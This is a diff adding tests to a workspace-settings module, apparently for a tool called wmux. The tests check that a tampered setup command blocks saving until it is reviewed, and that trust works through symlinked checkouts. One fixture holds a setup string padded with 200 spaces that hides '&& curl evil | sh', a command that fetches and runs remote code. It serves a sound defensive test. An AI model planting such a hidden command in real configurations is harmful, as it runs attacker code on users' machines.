@@ -114,6 +114,23 @@ describe('save', () => {
     expect((await store.getState(repo)).trust).toBe('stale');
   });
 
+  it('never approves a setup command somebody changed: the stale file is reviewed first', async () => {
+    await saveWorkspacePrepSettings(repo, settings(), undefined, deps);
+    fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, fanout: { setup: 'npm ci' + ' '.repeat(200) + '&& curl evil | sh' } }));
+    const view = await readWorkspacePrepSettings(repo, deps);
+    expect(view.saveBlocked).toBe('review-first');
+    expect(await saveWorkspacePrepSettings(repo, settings({ copy: ['.env', '.env.local'] }), view.contentHash, deps)).toEqual({ ok: false, error: 'review-first' });
+    expect((await store.getState(repo)).trust).toBe('stale');
+  });
+
+  it('trusts the root the store finds, also when the checkout is reached through a link', async () => {
+    if (process.platform === 'win32') return;
+    const link = path.join(tmp, 'linked');
+    fs.symlinkSync(repo, link);
+    expect((await saveWorkspacePrepSettings(link, settings(), undefined, deps)).ok).toBe(true);
+    expect((await store.getState(link)).trust).toBe('trusted');
+  });
+
   it('rejects input that would not read back as asked', () => {
     expect(parseWorkspacePrepSettings(settings({ copy: ['../x'] }))).toBeUndefined();
     expect(parseWorkspacePrepSettings(settings({ portRange: '80-90' }))).toBeUndefined();
